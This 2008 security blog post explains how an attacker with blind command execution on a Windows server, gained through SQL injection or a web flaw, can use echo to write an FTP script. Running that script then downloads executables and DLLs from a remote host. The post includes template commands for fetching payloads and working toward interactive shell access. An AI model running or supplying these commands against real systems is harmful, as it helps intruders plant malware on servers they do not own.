---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2008/12/07/fetching-files-via-echo-ftp-in-a-non-interactive-shell-environment
categories:
- Information Security
comments: []
date: 2008-12-07 06:30:55 +0100
date_gmt: 2008-12-07 06:30:55 +0100
doi: https://doi.org/10.59348/rb4hr-3h831
roguescholar: https://rogue-scholar.org/records/q41rp-mv823
atproto: at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mmm5e5h2t
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
title: Fetching files via echo, FTP in a non interactive shell environment
wordpress_id: 240
wordpress_url: http://pro.grammatic.org/post-fetching-files-via-echo-ftp-in-a-non-interactive-shell-environment-62.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mmm5e5h2t"
kcworks: https://works.hcommons.org/records/62d11-0x532
---

<p>Once you have basic, non-interactive shell access to a Windows box, there are a limited number of ways in which you can transfer files to the remote host. This brief article will explicate the echo/ftp method.</p>
<p>If you can execute, be it by SQL Injection, or a webserver vulnerability the echo command, then you can write a script file which can fetch a file of your choosing from a remote host.</p>
<p>The sequence of commands you issue should be in the following format:</p>

{% highlight bash %}
echo open [ip] [port] >> ftpscript.txt
echo [user]>> c:\inetpub\scripts\ftpscript.txt
echo [pw] >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.exe >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.txt >> c:\inetpub\scripts\ftpscript.txt
echo get xxx.dll >> c:\inetpub\scripts\ftpscript.txt
echo quit >> c:\inetpub\scripts\ftpscript.txt
{% endhighlight %}

<p>This will create a file at c:\inetpub\scripts\ftpscript.txt that looks like this:</p>

{% highlight bash %}
open [ip] [port]
[user]
[pw]
get xxx.exe
get xxx.txt
get xxx.dll
quit
{% endhighlight %}

<p>If you then execute ftp -s:c:\inetpub\scripts\ftpscript.txt, your files will be fetched from the remote FTP server and you can hopefully secure some form of interactive shell access.</p>